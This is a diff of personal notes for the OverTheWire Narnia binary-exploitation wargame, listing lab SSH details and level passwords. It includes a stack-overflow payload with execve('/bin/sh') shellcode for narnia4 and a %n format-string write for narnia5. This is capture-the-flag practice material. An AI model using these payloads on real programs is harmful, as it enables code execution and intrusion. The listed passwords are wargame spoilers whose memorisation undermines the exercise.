@@ -1,6 +1,9 @@
->passwords for next level is at /etc/narnia_pass
->problems and source code in /narnia 	:cd /narnia
->ssh narnia0@narnia.labs.overthewire.org -p 2226
+NARNIA - OTW WARGAME:
+
+passwords for next level is at /etc/narnia_pass
+problems and source code in /narnia 	:cd /narnia
+ssh narnia0@narnia.labs.overthewire.org -p 2226
+for peda integration: echo "source /usr/local/peda/peda.py">>~/.gdbinit
 
 narnia0:
 
@@ -28,7 +31,25 @@ narnia2:
 narnia3:
 	
 	pass=vaequeezee
-	eip offset seems to be 64+4=68
-	pop3ret = 0x80486dd
+	#took screenshot
+
+
+narnia4:
+	
+	pass= thaenohtai
+	./narnia4 $(python -c 'print "\x90"*240+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"+"A"*7+"\x48\xd8\xff\xff"')
+
+narnia5:
+	
+	pass=faimahchiy
+	./narnia5 $(python -c 'print "\x2c\xd7\xff\xff%496x%5$n"')
+
+narnia6:
+
+	pass= neezocaeng
+	
+
+
+
 	
 	
